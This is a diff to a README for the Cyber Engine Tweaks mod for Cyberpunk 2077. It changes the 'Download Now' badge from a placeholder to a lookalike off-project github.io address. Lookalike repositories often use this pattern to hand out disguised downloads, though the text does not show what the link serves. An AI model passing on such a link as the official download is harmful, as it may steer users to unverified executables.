@@ -8,7 +8,7 @@ Developed by the modding community, CET unlocks the full potential of **game cus
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-neon?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-neon?style=for-the-badge)](https://cyber-engine-tweaks-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Copy all files into your **Cyberpunk 2077/bin/x64** directory.  
